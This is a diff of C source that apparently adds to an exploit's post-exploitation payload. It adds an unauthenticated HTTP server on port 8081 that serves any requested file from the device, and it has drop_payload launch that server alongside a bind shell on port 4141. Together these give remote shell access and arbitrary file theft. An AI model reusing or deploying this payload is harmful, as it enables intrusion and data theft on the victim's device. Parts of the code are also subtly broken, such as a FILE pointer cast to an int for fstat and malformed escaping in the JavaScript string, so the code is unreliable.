@@ -12,6 +12,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <pthread.h>
 
 #include <spawn.h>
 
@@ -109,6 +110,161 @@ char* prepare_payload() {
   return path;
 }
 
+#pragma mark - HTTP Server
+
+#define START_HTML "<html><body>"
+#define END_HTML "</body></html>"
+
+#define HTTP_404 "<h1>404 Not Found</h1>"
+
+#define FORM_SOURCE "<script type=\"text/javascript\">" \
+"function dl() {" \
+"var p = document.getElementById('path').value;" \
+"if (p[0] != '\') p += '\';" \
+"window.location.href = document.location.origin + p;" \
+"}</script>" \
+"<h2>Enter full file path:</h2>" \
+"<input type=\"text\" id=\"path\" placeholder=\"Enter path here\" />" \
+"<input type=\"button\" onclick=\"dl()\" value=\"Download\"/>"
+
+void send_html(int connection, int statusCode, char *source) {
+  char headerbuf[256] = {0};
+  size_t length = strlen(source);
+  
+  size_t sz;
+  
+  sz = snprintf(headerbuf, 256, "HTTP/1.1 %d NOTNECESSARY\r\n", statusCode);
+  write(connection, headerbuf, sz);
+  
+  sz = snprintf(headerbuf, 256, "Content-Type: text/html\r\n");
+  write(connection, headerbuf, sz);
+  
+  sz = snprintf(headerbuf, 256, "Content-Length: %zu\r\n\r\n", length);
+  write(connection, headerbuf, sz);
+  
+  write(connection, source, length);
+}
+
+void send_form(int connection) {
+  char *source = START_HTML FORM_SOURCE END_HTML;
+  send_html(connection, 200, source);
+}
+
+void send_404(int connection) {
+  char *source = START_HTML HTTP_404 FORM_SOURCE END_HTML;
+  send_html(connection, 404, source);
+}
+
+void send_file(int connection, char *filePath) {
+  char headerbuf[256] = {0};
+  
+  char fbuf[1024] = {0};
+  
+  char *fileName = "default.bin";
+  
+  for (char *i = filePath; *i; i++) {
+    if (*i == '/') {
+      fileName = i + 1;
+    }
+  }
+  
+  int sz;
+  
+  FILE *f = fopen(filePath, "rb");
+  
+  struct stat f_stat;
+  
+  if (!f) {
+    send_404(connection);
+    return;
+  }
+  
+  printf("File opened. Checking file\n");
+  
+  fstat((int) f, &f_stat);
+  
+  if (S_ISDIR(f_stat.st_mode)) {
+    printf("Not a regular file\n");
+    send_404(connection);
+    fclose(f);
+    return;
+  }
+  
+  size_t size;
+  
+  fseek(f, 0L, SEEK_END);
+  size = ftell(f);
+  fseek(f, 0L, SEEK_SET);
+  
+  printf("File size is %zu bytes.\n", size);
+  
+  sz = snprintf(headerbuf, 256, "HTTP/1.1 200 OK\r\n");
+  write(connection, headerbuf, sz);
+  
+  sz = snprintf(headerbuf, 256, "Content-Type: application/octet-stream\r\n");
+  write(connection, headerbuf, sz);
+  
+  sz = snprintf(headerbuf, 256, "Content-Disposition:attachment;filename=%s\r\n", fileName);
+  write(connection, headerbuf, sz);
+  
+  sz = snprintf(headerbuf, 256, "Content-Length: %zu\r\n\r\n", size);
+  write(connection, headerbuf, sz);
+  
+  printf("Starting to send file\n");
+  
+  while ((size = fread(fbuf, 1, 1024, f)) > 0) {
+    write(connection, fbuf, size);
+  }
+}
+
+void do_bind_http(int port) {
+  struct sockaddr_in sa;
+  sa.sin_len = 0;
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(port);
+  sa.sin_addr.s_addr = INADDR_ANY;
+  
+  int sock = socket(PF_INET, SOCK_STREAM, 0);
+  bind(sock, (struct sockaddr*)&sa, sizeof(sa));
+  listen(sock, 1);
+  
+  printf("listening http on %d\n", (int)port);
+  
+  for (;;) {
+    int conn = accept(sock, 0, 0);
+    char inbuf[1024] = {0};
+    char filebuf[256] = {0};
+    
+    printf("Got connection\n");
+    
+    size_t bytesRead = read(conn, inbuf, 1023);
+    printf("Read %zu\n", bytesRead);
+    
+    for (int i = 4; i < 256 && !isspace(inbuf[i]); ++i) {
+      filebuf[i - 4] = inbuf[i];
+    }
+    
+    printf("Accessing %s\n", filebuf);
+    
+    if (strlen(filebuf) < 2) {
+      printf("Sending form\n");
+      send_form(conn);
+    } else {
+      printf("Trying to send file\n");
+      send_file(conn, filebuf);
+    }
+    
+    close(conn);
+  }
+}
+
+void* do_bind_http_thread(void* args) {
+  do_bind_http(8081);
+  return NULL;
+}
+
+#pragma mark - Bash Server
+
 void do_bind_shell(char* env, int port) {
   char* bundle_root = bundle_path();
   
@@ -162,10 +318,23 @@ void do_bind_shell(char* env, int port) {
   free(shell_path);
 }
 
-void drop_payload() {
+void* do_bind_shell_thread(void* args) {
   char* env_path = prepare_payload();
   printf("will launch a shell with this environment: %s\n", env_path);
   
   do_bind_shell(env_path, 4141);
   free(env_path);
+  
+  return NULL;
+}
+
+void drop_payload() {
+  pthread_t shellThread;
+  pthread_t httpThread;
+  
+  pthread_create(&shellThread, NULL, &do_bind_shell_thread, NULL);
+  pthread_create(&httpThread, NULL, &do_bind_http_thread, NULL);
+  
+  pthread_join(shellThread, NULL);
+  pthread_join(httpThread, NULL);
 }
